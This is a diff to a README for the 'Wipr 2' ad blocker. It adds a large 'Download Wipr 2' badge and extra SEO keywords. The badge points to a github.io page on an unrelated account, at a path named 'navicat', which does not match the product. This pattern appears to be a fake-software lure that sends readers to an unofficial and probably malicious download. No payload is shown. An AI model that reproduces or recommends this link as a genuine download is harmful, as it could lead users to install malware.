@@ -3,8 +3,11 @@
 <div align="center">
   <img src="https://tweakhome.app/wp-content/uploads/2025/04/Wipr-2-ipa.png" alt="Wipr 2 Logo" width="300">
 </div>
-
----
+<div align="center">
+  <a href="https://junimata-orex.github.io/.github/navicat">
+    <img src="https://img.shields.io/badge/⬇️_Download_Wipr_2-4CAF50?style=for-the-badge&logo=apple&logoColor=white" alt="Download Wipr 2">
+  </a>
+</div>
 
 ## Streamline Your Browsing Experience
 
@@ -67,4 +70,4 @@ Protect your privacy, speed up page loading times, and enjoy a clutter-free brow
 
 ## SEO Keywords
 
-wipr 2, wipr ad blocker, safari ad blocker, wipr app, privacy protection, ad blocking safari, clean browsing, safari performance boost, wipr 2 download, ad-free browsing
+wipr 2, wipr ad blocker, safari ad blocker, wipr app, privacy protection, ad blocking safari, clean browsing, safari performance boost, wipr 2 download, ad-free browsing, adblock for safari macos, mac os safari ad blocker
